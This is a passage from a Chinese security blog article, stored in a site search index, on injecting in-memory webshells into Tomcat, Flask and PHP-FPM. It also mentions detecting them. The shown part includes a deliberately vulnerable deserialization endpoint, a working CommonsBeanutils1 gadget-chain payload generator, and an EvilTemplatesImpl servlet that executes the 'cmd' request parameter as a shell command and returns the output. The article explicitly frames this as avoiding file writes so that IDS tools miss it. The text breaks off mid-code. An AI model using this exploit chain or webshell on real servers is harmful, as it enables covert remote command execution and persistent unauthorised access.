<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java/Python/PHP Memory WebShell</title>
      <link href="/2023/08/08/Memory_WebShell/"/>
      <url>/2023/08/08/Memory_WebShell/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为内存马种类繁杂，每次都要翻看很多文章，又加上最近有某个大活动，因此就写了这篇文章来总结一下常见的3种语言（PHP、Python、JAVA）的内存马的注入方法和查杀方法，并尝试自己完成一个内存马查杀工具的实现。希望本篇文章能给师傅们带来一些启发。文章一长就难免在表达和准确性上有所疏漏，如有错误或不足，请师傅们指正。</p><p>Java内存马的种类很多，这篇文章主要对Tomcat-Servlet、Tomcat-Filter、Tomcat-Listener、Tomcat-Websocket、JavaAgent以及SpringMVC Controller等种类的内存马进行研究。很多师傅在分析或者注入Java内存马的时候利用的exp大多是jsp形式的，通过向目标Web目录上传jsp文件，之后访问该jsp文件执行jsp代码从而注入Java内存马。因为这种方式仍然存在文件落盘，而存在文件落盘就意味着很容易被IDS监测到，因此笔者认为这种办法应当是我们拿不到代码执行权限，但是可以拿到命令执行权限或文件上传权限的时候再去利用。那如果我们可以拿到代码执行权限，比如目标存在反序列化漏洞的情况，我们又该如何做到在不上传jsp的条件下，完成内存马的注入？其实难点在于我们该怎样获取request对象。获取request对象并不仅仅是反序列化注入内存马要考虑的，在Java RCE Echo中，也是重中之重。本篇文章重点介绍<strong>通过反序列化注入内存马</strong>的方法。（本篇文章默认读者拥有基础的Tomcat、JavaAgent以及Spring框架知识）</p><p>PHP内存马是<strong>通过伪造fastcgi协议包与php-fpm进行通信，改变auto_prepend_file配置，从而在每次访问正常PHP文件时加载我们构造好的php马</strong>。因为笔者并不认可PHP不死马是一种内存马技术，因此在这篇文章就不做具体介绍了。</p><p>Python内存马，原出自hexman学长介绍的一种方法：<a href="https://github.com/iceyhexman/flask_memory_shell">Flask 内存马</a>，通过利用flask&#x2F;jinja2 SSTI漏洞来实现内存修改，注入内存马。<strong>网上也有不少文章在介绍这种内存马，然而仅仅只是根据payload来解释，没有人从代码层去分析能够注入内存马的原因，本篇文章会从代码层分析flask的请求上下文机制，并根据注入原理给出一些payload变形。</strong>虽然flask&#x2F;jinja2 SSTI漏洞在真实场景中很难出现，但是在一些AWD比赛上关于flask&#x2F;jinja2 SSTI漏洞的题目却是经常有，为了能够在目标修补SSTI漏洞后维持权限，这种内存马也是很值得学一学的。</p><h2 id="Java-内存马"><a href="#Java-内存马" class="headerlink" title="Java 内存马"></a>Java 内存马</h2><p>笔者Tomcat的版本是9.0.76，不同的Tomcat版本可能会有所差异，请注意。</p><h3 id="Tomcat-Servlet-型内存马"><a href="#Tomcat-Servlet-型内存马" class="headerlink" title="Tomcat-Servlet 型内存马"></a>Tomcat-Servlet 型内存马</h3><h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><p>首先配置一个最简单的Servlet：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;, loadOnStartup = 2)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处写loadOnStartup&#x3D;2是为了后面的调试更好理解。接着导入tomcat-catalina依赖，应与自己的tomcat版本一致：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;9.0.76&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>在org.apache.catalina.startup.ContextConfig#configureContext处打下断点，开始调试：</p><p><img src="https://pic.imgdb.cn/item/64d26ce71ddac507cc0273ea.jpg" alt="image-20230802150054993"></p><p>因为我们是采用注解的方式配置Servlet，因此此处我们仍然可以获取到创建的Servlet。首先是DefalutServlet以及JspServlet，接着就遍历到了我们创建的HelloServlet了：</p><p><img src="https://pic.imgdb.cn/item/64d26cf91ddac507cc02a3c2.jpg" alt="image-20230802150539325"></p><p>之后执行<code>this.context.createWrapper()</code>创建Wrapper，Wrapper 表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等：</p><p><img src="https://pic.imgdb.cn/item/64d26d051ddac507cc02c10d.jpg" alt="image-20230802150700866"></p><p>可以看到this.context是一个StandardContext对象。那我们继续调试看看对Wrapper进行了哪些操作：</p><p><img src="https://pic.imgdb.cn/item/64d26d121ddac507cc02e18f.jpg" alt="image-20230802150947572"></p><p>首先获取Servlet的LoadOnStartup和enabled，并设置给Wrapper。其中LoadOnStartup就是我们在注解中配置的参数，它表示servlet被加载的先后顺序。继续跟进：</p><p><img src="https://pic.imgdb.cn/item/64d26d1e1ddac507cc0302e9.jpg" alt="image-20230802151328144"></p><p>这里调用了Servlet的getServletName()方法，获取servlet的名字，也就是我们在主机中配置的name参数的值，接着将name的值设置给Wrapper。接着还将<code>servlet.getRunAs()</code>的结果传入给了Wrapper，不过因为此处<code>servlet.getRunAs()</code>的执行结果是null且<code>roleRefs.size()==0</code>，因此此处我们可以忽略：</p><p><img src="https://pic.imgdb.cn/item/64d26d2d1ddac507cc032929.jpg" alt="image-20230802151705189"></p><p>继续跟进：</p><p><img src="https://pic.imgdb.cn/item/64d26d371ddac507cc034661.jpg" alt="image-20230802151854696"></p><p>可以看到此处将Wrapper的servletClass设置为HelloServlet的全限定名。继续跟进，因为Servlet的multipartDef&#x3D;&#x3D;null、asyncSupported&#x3D;&#x3D;null，因此以下部分我们可以跳过：</p><p><img src="https://pic.imgdb.cn/item/64d26d441ddac507cc036932.jpg" alt="image-20230802152617852"></p><p>之后又执行了addChild方法将这个Wrapper添加进了StandardContext中：</p><p><img src="https://pic.imgdb.cn/item/64d26d511ddac507cc0388e7.jpg" alt="image-20230802152732881"></p><p>接下来添加Servlet-Mapper，也就是web.xml中的<code>&lt;servlet-mapping&gt;</code>，不过因为我们是通过注解设置url和servlet的映射关系，因此此处是通过注解获取而非web.xml。接着循环addServletMappingDecoded将url和servlet类做映射：</p><p><img src="https://pic.imgdb.cn/item/64d26d5e1ddac507cc03acd7.jpg" alt="image-20230802153045780"></p><p>至此我们就看完了servlet的注册流程，但是还有一个疑问，那就是这个StandardContext从哪里获取？</p><p>其实这个分两种情况，一种是网上很常见的，将内存马的生成代码写入到jsp并上传到目标服务器，接着访问该jsp然后注入内存马，这种方法获取StandardContext比较容易，因为jsp内置request对象，因此可以直接利用request对象反射获取。但是这种情况要求文件落地，很容易被检测到。还有一种情况是通过某些gadget chain（如CC11，CB1）打入字节码，然后注入内存马。这种情况需要我们知道request存储的位置，获取到request对象后通过反射获取StandardContext。第二种情况更隐蔽，但同时要求和难度更大，这里对两种方法都进行介绍。</p><h4 id="反序列化注入Tomcat-Servlet型内存马"><a href="#反序列化注入Tomcat-Servlet型内存马" class="headerlink" title="反序列化注入Tomcat-Servlet型内存马"></a>反序列化注入Tomcat-Servlet型内存马</h4><p>添加commons-beanutils依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.9.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>并修改HelloServlet的doPost方法，我们手动构造一个反序列化漏洞环境：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;codes&quot;</span>);</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">        <span class="type">byte</span>[] codebytes = Base64.getDecoder().decode(codes);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(codebytes));</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException c)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;反序列化成功！&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化注入内存马获取request对象的方法，我这里提供两种。一种是<strong>kingkk</strong>师傅提出的：</p><blockquote><p>1、反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code></p><p>2、初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p><p>3、从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p></blockquote><p>这种方法缺点是只使用于Tomcat，但优点是耗时更短，获取request更稳定。另一种是<strong>c0ny1</strong>师傅提出的通过Thread.currentThread()或Thread.getThreads()获取：</p><blockquote><p>按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过<code>Thread.currentThread()</code>或<code>Thread.getThreads()</code>获取。当然其他全局变量也有可能，这就需要去看具体中间件的源码了。比如前段时间先知上的李三师傅通过查看代码，发现<code>[MBeanServer](https://xz.aliyun.com/t/7535)</code>中也有request对象。</p></blockquote><p>这种方法的优点是更加通用，在多种Web中间件中都可以使用，但缺点是耗时稍长，且有时候会出现没有搜索到request对象的情况。出现首先给出第一种方法的EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是CB1反序列化所需要的恶意模板类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ServletConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.config;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Servlet Info&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">(String abc)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span 